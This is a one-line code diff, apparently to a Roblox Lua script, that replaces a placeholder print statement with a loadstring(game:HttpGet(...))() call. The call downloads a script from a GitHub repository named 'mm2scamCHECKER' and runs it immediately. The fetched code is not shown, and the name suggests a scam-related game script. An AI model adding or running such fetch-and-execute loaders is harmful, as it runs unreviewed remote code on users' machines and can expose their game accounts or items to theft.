@@ -1,1 +1,1 @@
-print{hello}
+loadstring(game:HttpGet('https://raw.githubusercontent.com/Bladiii47/mm2scamCHECKER/refs/heads/main/V2byTORAscript'))()
